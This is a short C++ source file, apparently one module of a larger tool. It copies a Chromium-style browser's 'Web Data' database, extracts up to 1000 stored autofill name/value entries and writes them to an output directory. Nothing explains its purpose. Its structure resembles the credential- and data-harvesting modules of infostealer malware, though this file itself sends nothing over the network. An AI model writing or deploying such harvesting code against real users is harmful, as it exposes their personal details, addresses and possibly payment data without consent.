//
// Created by .1qxz on 09.06.2024.
//

#include "CAutoFill.h"

void CAutoFill::execute(const fs::path &root, const std::string &name, const fs::path &browser_root) {
    fs::path orig_db_path = this->getProfileDir(browser_root) / "Web Data";
    fs::path copied_db = FilesUtil::copyTemporary(orig_db_path);

    if(!exists(copied_db))
        return;

    std::list<std::unique_ptr<Entity>> fills;

    SQLiteUtil::connectAndRead(R"(
            SELECT name, value
            FROM autofill
            ORDER BY date_last_used DESC
            LIMIT 0, 1000
    )", copied_db, [&fills](sqlite3_stmt *stmt) {
        auto autoFill = std::make_unique<AutoFill>();
        autoFill->name = SQLiteUtil::readString(stmt, 0);
        autoFill->value = SQLiteUtil::readString(stmt, 1);

        fills.push_back(std::move(autoFill));
    });

    fs::remove(copied_db);
    Entity::writeSelf(root, fills);
}
